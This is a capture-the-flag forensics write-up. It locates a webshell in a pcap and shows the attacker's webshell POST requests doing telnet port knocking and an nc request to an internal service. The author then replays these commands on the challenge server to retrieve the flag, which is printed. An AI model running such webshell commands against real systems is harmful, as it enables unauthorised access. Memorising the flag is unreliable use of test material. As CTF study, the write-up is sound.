# notor (forensics, 372p, 19 solved)

## Description

```
How did the attacker gain access to our secure infrastructure? Wink Wink to the attached pcap.

Flag format: CTF{sha256}

Target: 138.68.93.187:1234
```

In the task we get a 270MB pcap file (not attached).
We also get a remote endpoint (important, we missed this initially!).

## Task analysis

The pcap seems to contain basically a dirbuster run against some target.
We suspect the idea is that attacker `found something` and exploited it.

### Export HTTP objects

A nice trick we can use here is wireshark's `export HTTP objects`.
The idea is that most of the 404 responses from the target will look identical, and we're looking for something that stands out.

This way we quickly find a much `bigger` object: [webshell](shelladsasdadsasd.html.php)

### Follow the attack

Now that we have this, we can find the requests to this webshell and follow what attacker used:

```
POST /shelladsasdadsasd.html.php?feature=shell HTTP/1.1
Host: h:1234
Connection: keep-alive
Content-Length: 328
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
DNT: 1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://h:1234
Referer: http://h:1234/shelladsasdadsasd.html.php
Accept-Encoding: gzip, deflate
Accept-Language: ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7,it;q=0.6

cmd=telnet%2010.5.0.6%2010001%3Btelnet%2010.5.0.6%2010002%3Btelnet%2010.5.0.6%2010003%3Btelnet%2010.5.0.6%205000%3Btelnet%2010.5.0.6%2010008%3Btelnet%2010.5.0.6%205000%3Btelnet%2010.5.0.6%206000%3Btelnet%2010.5.0.6%2019999%3B%20echo%20'GET%20%2F%20HTTP%2F1.1%5Cr%5Cn%5Cr%5Cn'%20%7C%20nc%2010.5.0.6%205000&cwd=%2Fvar%2Fwww%2FhtmlHTTP/1.1 200 OK
Date: Tue, 01 Dec 2020 22:24:24 GMT
Server: Apache
Content-Length: 258
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"stdout":["Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","(UNKNOWN) [10.5.0.6] 5000 (?) : Connection refused"],"cwd":"\/var\/www\/html"}POST /shelladsasdadsasd.html.php?feature=shell HTTP/1.1
```

While this attempt failed, we can see that there is some `port knocking` using `telnet` and then attacker tries to get something from `http://10.5.0.6:5000`

If we look for other responses from this host/port we find:

```
GET / HTTP/1.1


HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69
Server: Werkzeug/1.0.1 Python/2.7.12
Date: Tue, 01 Dec 2020 22:25:13 GMT
```

Length 69 seems like a flag format, but the data are not in the pcap!

## Replay attack

Notice that we know the remote endpoint.
We can, therefore, access the very same webshell and perform the same attack!

The trick is the telnet knocks sent by attacker are not valid.
But we can just look at the pcap before the successful attempt, and check which ports were touched:

```
10001
10002
10003
22
445
```

So we use the webshell to run:

```
telnet 10.5.0.6 10001;telnet 10.5.0.6 10002;telnet 10.5.0.6 10003; telnet 10.5.0.6 22; telnet 10.5.0.6 445; echo 'GET / HTTP/1.1\r\n\r\n' | nc 10.5.0.6 5000
```

And get back:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69
Server: Werkzeug/1.0.1 Python/2.7.12
Date: Mon, 07 Dec 2020 19:39:58 GMT

ctf{4fde84cc72b033f0834f1181c4e1dc77a82a595c3652c8b9d02b28b8e1b62124}
```
